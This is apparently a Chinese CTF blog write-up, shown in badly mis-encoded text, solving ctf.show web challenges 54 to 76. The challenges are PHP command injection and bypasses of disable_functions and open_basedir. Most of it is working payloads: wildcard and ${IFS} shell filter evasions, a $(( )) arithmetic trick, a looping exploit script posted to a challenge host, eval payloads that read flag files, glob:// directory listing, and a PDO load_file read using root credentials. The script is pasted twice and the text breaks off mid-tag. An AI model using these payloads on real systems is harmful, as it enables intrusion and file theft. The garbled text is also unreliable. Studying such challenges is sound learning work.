        <content type="html"><![CDATA[<h2 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¸ºä¸Šï¼›<br> 1ã€ç”¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        breakimport requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>2ã€ä½¿ç”¨/binè¿™ä¸ªç›®å½•ï¼š<br>       binä¸ºbinaryçš„ç®€å†™ä¸»è¦æ”¾ç½®ä¸€äº› ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰<br>       è¿™é¢˜åˆ©ç”¨/bin/base64<br>base64è¿™ä¸ªå‘½ä»¤å°±æ˜¯å°†æŒ‡å®šçš„æ–‡ä»¶çš„å†…å®¹ä»¥base64åŠ å¯†çš„å½¢å¼è¾“å‡ºã€‚<br>å› ä¸ºè¿‡æ»¤äº†å­—æ¯ï¼Œæ­£å¥½å¯ä»¥ç”¨64æ¥åŒ¹é…ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure><h2 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¦‚ä¸Šï¼›<br>åŒ55ä¸€æ ·è¿ç”¨/binç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”±äº/binä¸Šæ‹¥æœ‰catï¼Œå› æ­¤ç”¨/bin/cat flag.php;ä¾¿å¯æŸ¥æ‰¾flagã€‚</span><br></pre></td></tr></table></figure><p>ç”±äºcat flag . php è¢«è¿‡æ»¤åˆ™<br>ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h2 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h2><p>disable_functionså‡½æ•°å¯åŠ¨åä¼šç¦æ­¢ä¸€äº›å‡½æ•°ä½¿å¾—ä¸€äº›å‘½ä»¤æ— æ³•ä½¿ç”¨ã€‚<br>åˆæ˜¯æ–°å§¿åŠ¿ï¼ŒçŸ¥è¯†ç‚¹æ˜¯$(( ))ä¸æ•´æ•°è¿ç®—ã€‚æƒ³åŠæ³•æ„é€ å‡º36.<br>åŒå°æ‹¬å·çš„ä½œç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  åŒå°æ‹¬å· (( )) æ˜¯ Bash Shell ä¸­ä¸“é—¨ç”¨æ¥è¿›è¡Œæ•´æ•°è¿ç®—çš„å‘½ä»¤ï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œå†™æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šè¿ç»´ä¸­å¸¸ç”¨çš„è¿ç®—å‘½ä»¤ã€‚</span><br><span class="line">é€šä¿—åœ°è®²ï¼Œå°±æ˜¯å°†æ•°å­¦è¿ç®—è¡¨è¾¾å¼æ”¾åœ¨((å’Œ))ä¹‹é—´ã€‚</span><br><span class="line"></span><br><span class="line">è¡¨è¾¾å¼å¯ä»¥åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªï¼Œå¤šä¸ªè¡¨è¾¾å¼ä¹‹é—´ä»¥é€—å·,åˆ†éš”ã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼çš„æƒ…å†µï¼Œä»¥æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª (( ))å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚</span><br><span class="line"></span><br><span class="line">å¯ä»¥ä½¿ç”¨$è·å– (( )) å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨$è·å¾—å˜é‡å€¼æ˜¯ç±»ä¼¼çš„ã€‚</span><br><span class="line"></span><br><span class="line">å¯ä»¥åœ¨ (( )) å‰é¢åŠ ä¸Š$ç¬¦å·è·å– (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥ c=$((a+b)) ä¸ºä¾‹ï¼Œå³å°† a+b è¿™ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœèµ‹å€¼ç»™å˜é‡ cã€‚</span><br></pre></td></tr></table></figure><p>å¤§ä½¬æ›¾è¯´ï¼šå…³äºå–åï¼Œæ ¹æ®æˆ‘å­¦ä¹ ä¸‹æ¥å¾—åˆ°çš„ç»éªŒå°±æ˜¯å¦‚æœb=<del>aï¼Œé‚£ä¹ˆa+b=-1<br>æ³¨æ„ï¼š$(())çš„å€¼æ˜¯0ã€‚$((</del>$(())))çš„å€¼æ˜¯-1ã€‚$((     $((<del>$(())))       $((</del>$(())))        ))  æ˜¯-2;<br>åˆ™æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥<br>-2çš„æ„æˆæ˜¯ç”±ä¸¤ä¸ª-1ç›¸åŠ å¾—æ¥çš„ä¸”å†…éƒ¨ä¹Ÿæ˜¯é»˜è®¤ç›¸åŠ ï¼›ï¼ˆå› æ­¤36åˆ™éœ€è¦-37æ¥å–å //è¯´å®è¯æ²¡çœ‹æ‡‚ï¼›ï¼‰<br>å› æ­¤åˆ™éœ€è¦ä¸‰åä¸ƒä¸ª$((<del>$(()))) ï¼Œä¹‹ååœ¨å–åï¼Œå–åçœ‹å¤§ä½¬è¯´æ˜¯$((</del>$(( ))))ã€‚<br>å› æ­¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))</span><br></pre></td></tr></table></figure><h2 id="web-58-65"><a href="#web-58-65" class="headerlink" title="web 58~65"></a>web 58~65</h2><p>  è¯»æ–‡ä»¶çš„å‡½æ•°æœ‰è¿™äº›ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure><p>fgets()å‡½æ•°ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  c=</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$b</span>=fgets(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åèšå‰‘è¿æ¥ã€‚ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆæƒ…å†µğŸ˜‚ï¼‰</p><h2 id="web-66"><a href="#web-66" class="headerlink" title="web 66"></a>web 66</h2><p>ï¼ˆè¯¥é¢˜çš„flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œhtmlä¸‹çš„flag.phpæ˜¯å‡çš„ï¼‰æˆ‘ä»¬çœ‹åˆ°å‡çš„åå¯ä»¥ç”¨ä¸‹é¢æ–¹æ³•æ‰“å¼€ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">highlight_file(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æœ¬é¢˜çš„print_rï¼ˆï¼‰è¢«ç¦</span><br><span class="line">å¯ä»¥ç”¨var_dump()æ¥ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><h2 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()è¢«è¿‡æ»¤ï¼Œä½†æ˜¯<span class="keyword">include</span>å´æ²¡æœ‰è¢«banå› æ­¤å¯ä»¥ç”¨æ–‡ä»¶åŒ…å«ã€‚</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69~70"></a>web 69~70</h2><p>å¦‚æœvar_dumpè¢«banå°±ä½¿ç”¨var_export()æ¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="web-70"><a href="#web-70" class="headerlink" title="web 70"></a>web 70</h2><p>é¢˜ç›®æºç ï¼ˆåœ¨é™„ä»¶ä¸­ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();<span class="comment">////å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®</span></span><br><span class="line">        ob_end_clean();<span class="comment">//ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹</span></span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>ï¼ˆç¼“å†²åŒºï¼šç¼“å†²åŒºåˆç§°ä¸ºç¼“å­˜ï¼Œå®ƒæ˜¯å†…å­˜ç©ºé—´çš„ä¸€éƒ¨åˆ†ã€‚<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å†…å­˜ç©ºé—´ä¸­é¢„ç•™äº†ä¸€å®šçš„å­˜å‚¨ç©ºé—´ï¼Œè¿™äº›å­˜å‚¨ç©ºé—´ç”¨æ¥ç¼“å†²è¾“å…¥æˆ–è¾“å‡ºçš„æ•°æ®ï¼Œè¿™éƒ¨åˆ†é¢„ç•™çš„ç©ºé—´å°±å«åšç¼“å†²åŒºã€‚<br>   ç¼“å†²åŒºæ ¹æ®å…¶å¯¹åº”çš„æ˜¯è¾“å…¥è®¾å¤‡è¿˜æ˜¯è¾“å‡ºè®¾å¤‡ï¼Œåˆ†ä¸ºè¾“å…¥ç¼“å†²åŒºå’Œè¾“å‡ºç¼“å†²åŒºã€‚<br>    æ¯”å¦‚æˆ‘ä»¬ä»ç£ç›˜é‡Œå–ä¿¡æ¯ï¼Œæˆ‘ä»¬å…ˆæŠŠè¯»å‡ºçš„æ•°æ®æ”¾åœ¨ç¼“å†²åŒºï¼Œ<br>è®¡ç®—æœºå†ç›´æ¥ä»ç¼“å†²åŒºä¸­å–æ•°æ®ï¼Œç­‰ç¼“å†²åŒºçš„æ•°æ®å–å®Œåå†å»ç£ç›˜ä¸­è¯»å–ï¼Œ<br>è¿™æ ·å°±å¯ä»¥å‡å°‘ç£ç›˜çš„è¯»å†™æ¬¡æ•°ï¼Œ<br>å†åŠ ä¸Šè®¡ç®—æœºå¯¹ç¼“å†²åŒºçš„æ“ä½œå¤§å¤§å¿«äºå¯¹ç£ç›˜çš„æ“ä½œï¼Œæ•…åº”ç”¨ç¼“å†²åŒºå¯å¤§å¤§æé«˜è®¡ç®—æœºçš„è¿è¡Œé€Ÿåº¦ã€‚ï¼‰<br><strong>æœ¬é¢˜æ˜¯åœ¨æˆ‘ä»¬è¾“å…¥å‘½ä»¤åè¾“å‡ºæ—¶å¯¹è¾“å‡ºæ•°æ®å…ˆè¿›è¡Œç¼“å­˜ï¼Œç¼“å­˜çš„æ•°æ®é€šè¿‡preg_replace()å°†å­—æ¯å’Œæ•°å­—éƒ½ç»™æ›¿æ¢ä¸ºï¼Ÿï¼Œä½¿å¾—æˆ‘ä»¬æ— æ³•æ­£å¸¸æŸ¥çœ‹ã€‚</strong><br>ä½¿ç”¨exit()/die()æå‰ç»“æŸï¼Œè¿™æ ·å°±ä¸ä¼šå°†å­—ç¬¦æ›¿æ¢ä¸ºé—®å·ï¼ˆåœ¨æˆ‘çœ‹æ¥ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰è¿›è¡Œä¸‹é¢çš„å¾—åˆ°ç¼“å­˜åŒºæ•°æ®çš„ä»£ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>web72 ä¸ä¼š</p><h2 id="web-73ã€74"><a href="#web-73ã€74" class="headerlink" title="web 73ã€74"></a>web 73ã€74</h2><p>æ— æºç ï¼Œå¯æ ¹æ®71ã€72æ¥åšã€‚<br>å…¶ä»–å¤§ä½¬éƒ½è¯´å­˜åœ¨open_basedirå‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨globä¼ªåè®®æ¥ç­›é€‰ç›®å½•ã€‚<br>globä¼ªåè®®ï¼šglob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼<br>æœ¬é¢˜ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">   <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥æŸ¥æ‰¾åˆ°flagc.txtæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°ã€‚</p><h2 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75~76"></a>web 75~76</h2><p>å’Œä¸Šé¢˜ä¸€æ ·ï¼Œé€šè¿‡ä¸Šé¢˜è„šæœ¬å¯ä»¥çœ‹åˆ°flagå®åœ¨flag36.txtä¸­ï¼Œä½†ä¹‹åæ˜¯ç”±include()å‡½æ•°å»æŠ¥é”™ï¼Œä¹‹åå‘ç°æ˜¯open_basedirå½±å“ä½¿å¾—è·¯å¾„å—åˆ°é™åˆ¶ï¼Œä¸æ‡‚,çœ‹åˆ°å¤§ä½¬wpå‘ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);<span class="comment">//è¿æ¥æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;<span class="comment">//query()æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè¿”å›ç»“æœé›†å¯¹è±¡ï¼Œä»ä¸­å¯ä»¥çœ‹å‡ºè¯¥æ®µä»£ç æ˜¯å°†flag36.txtå†…å®¹ä¼ åˆ°$rowä¸­ï¼Œå¹¶è¾“å‡ºã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="comment">//å›æ˜¾é”™è¯¯ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//PDOExceptionæ˜¯é”™è¯¯å¼‚å¸¸ã€‚</span></span><br></pre></td></tr></table></figure><p>å¤§å¸ˆå‚…ä»¬è¯´æ•°æ®åº“çš„è¿æ¥æ˜¯è¯»é…ç½®æ–‡ä»¶å¾—åˆ°çš„ã€‚è‡³äºé…ç½®æ–‡ä»¶åœ¨å“ªã€‚ã€‚é¬¼çŸ¥é“ã€‚ã€‚ã€‚<br>ä¸è¿‡è¿™ç§æ‹¿SQLè¯­å¥æ¥è¯»æ–‡ä»¶ç»•è¿‡open_basedirå’Œdisable_functionçš„å§¿åŠ¿å®åœ¨æ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ã€‚</p><p>PDO<br>PDO()å°±æ˜¯PHP data Object æä¾›äº†PHPæ“ä½œå¤šç§æ•°æ®åº“çš„ç»Ÿä¸€çš„æ¥å£,ä½¿ç”¨çš„ä¸»è¦æ€è·¯ï¼š<br>1ã€æ·»åŠ <br>      ï¼ˆ1ï¼‰è¿æ¥æ•°æ®åº“ã€æ•°æ®åº“çš„ç”¨æˆ·åã€æ•°æ®åº“çš„å¯†ç <br>                                         ï¼ˆ2ï¼‰ç”ŸæˆPDOå¯¹è±¡<br>                                         ï¼ˆ3ï¼‰æ‰§è¡Œæ·»åŠ  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//è¿æ¥æ•°æ®åº“</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//æ•°æ®åº“çš„ç”¨æˆ·å</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//æ•°æ®åº“çš„å¯†ç </span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span 